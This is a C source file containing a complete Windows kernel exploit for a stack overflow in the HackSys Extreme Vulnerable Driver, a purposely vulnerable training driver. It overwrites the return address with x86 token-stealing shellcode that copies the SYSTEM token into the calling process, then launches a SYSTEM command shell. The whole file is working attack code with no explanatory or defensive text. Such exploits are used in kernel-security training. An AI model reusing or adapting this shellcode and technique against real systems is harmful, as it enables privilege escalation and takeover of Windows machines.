#include <stdio.h>
#include <windows.h>
#include <ShlObj.h>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

#define KTHREAD_OFFSET    0x124    
#define EPROCESS_OFFSET   0x050  
#define PID_OFFSET        0x0B4   
#define FLINK_OFFSET      0x0B8    
#define TOKEN_OFFSET      0x0F8    
#define SYSTEM_PID        0x004   

#define EIP_OFFSET		  0x820		


HANDLE open_device()
{
	printf("\n[?] Trying to get handle to device\n");

	LPCSTR lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver";				
	DWORD dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
	DWORD dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	DWORD dwCreationDisposition = OPEN_EXISTING;
	DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
	HANDLE hTemplateFile = NULL;

	HANDLE hDevice = CreateFileA(lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("\t[-] Failed to get Handle to device!\n");
		system("pause");
		exit(0);
	}

	printf("\t[+] Got handle to device: 0x%X\n\n", hDevice);
	return hDevice;
}


void Send_IOCTL(HANDLE *device)
{
	printf("[?] Sending IOCTL \n");

	DWORD userModeBufferSize = 0x824;																		
	BYTE* userModeBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, userModeBufferSize);		

	if (!userModeBuffer) {
		printf("\n\t[-] Failed To Allocate userModeBuffer Memory: 0x%X\n", GetLastError());
		exit(0);
	}
	else {
		printf("\t[+] userModeBuffer Memory Allocated: 0x%p\n", userModeBuffer);
		printf("\t[+] userModeBuffer Allocation Size: 0x%X\n", userModeBufferSize);
	}

	char shellcode[] = (
		"\x60"                            // pushad
		"\x31\xc0"                        // xor eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"    // mov eax,[fs:eax+0x124]
		"\x8b\x40\x50"                    // mov eax,[eax+0x50]
		"\x89\xc1"                        // mov ecx,eax
		"\xba\x04\x00\x00\x00"            // mov edx,0x4
		"\x8b\x80\xb8\x00\x00\x00"        // mov eax,[eax+0xb8]
		"\x2d\xb8\x00\x00\x00"            // sub eax,0xb8
		"\x39\x90\xb4\x00\x00\x00"        // cmp [eax+0xb4],edx
		"\x75\xed"                        // jnz 0x1a
		"\x8b\x90\xf8\x00\x00\x00"        // mov edx,[eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"        // mov [ecx+0xf8],edx
		"\x61"                            // popad
		"\x31\xc0"                        // xor eax,eax
		"\x5d"                            // pop ebp
		"\xc2\x08\x00"                    // ret 0x8
		);

	LPVOID Elevate_Privs;
	Elevate_Privs = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (Elevate_Privs == NULL) 
	{
		printf("\t[-] VirtualAlloc : Shellcode Failed\n");
		exit(1);
	}

	printf("\t[+] VirtualAlloc Shellcode at: 0x%p\n", Elevate_Privs);

	memcpy(Elevate_Privs, shellcode, sizeof(shellcode));

	RtlFillMemory(userModeBuffer, userModeBufferSize, 0x41);

	PVOID Ret_Address = NULL;
	Ret_Address = (PVOID)(((ULONG)userModeBuffer + userModeBufferSize) - sizeof(ULONG));
	*(PULONG)Ret_Address = Elevate_Privs;

	printf("\t[+] EIP Overwritten with Shellcode Address: 0x%p\n", *(PULONG)Ret_Address);
	printf("\t[+] EIP in userModeBuffer at: 0x%p\n", Ret_Address);

	int Calculated_EIP_OFFSET;
	Calculated_EIP_OFFSET = (int)((ULONG)Ret_Address - (ULONG)userModeBuffer);
	printf("\t[+] EIP \ Offset: 0x%x\n", Calculated_EIP_OFFSET);
	if (Calculated_EIP_OFFSET != EIP_OFFSET)
	{
		printf("\n\n\t[-] EIP Offset Wrong : It should be 0x%x", EIP_OFFSET);
		printf("\n\t[-] Exiting Exploit .....\n\n");
		exit(1);
	}


	DWORD size_returned = 0;

	DWORD dwIoControlCode = HACKSYS_EVD_IOCTL_STACK_OVERFLOW;
	LPVOID lpOutBuffer = NULL;
	DWORD nOutBufferSize = NULL;
	LPDWORD lpBytesReturned = &size_returned;
	LPOVERLAPPED lpOverlapped = NULL;

	printf("\n[?] Sending IOCTL ..... \n\n");
	BOOL sent_ioctl = DeviceIoControl(
		device,
		dwIoControlCode,
		userModeBuffer,
		userModeBufferSize,
		lpOutBuffer,
		nOutBufferSize,
		lpBytesReturned,
		lpOverlapped
	);

	if (sent_ioctl == 0)
	{
		printf("[-] Error Sending IOCTL\n");
		exit(0);
	}

	HeapFree(GetProcessHeap(), 0, (LPVOID)userModeBuffer);
	printf("\t[+] IOCTL Sent\n\n");

}


int main()
{
	HANDLE device = open_device();

	Send_IOCTL(device);
	if (!IsUserAnAdmin())
	{
		printf("\t\t[-] Priv Escalation Failed to get NT SYSTEM\n\n");
		return 1;
	}
	else
	{
		printf("\t\t[+][+] HooraaaaaY Got SYSTEM prompt\n\n");
		system("cmd");
	}
	
	return 0;
}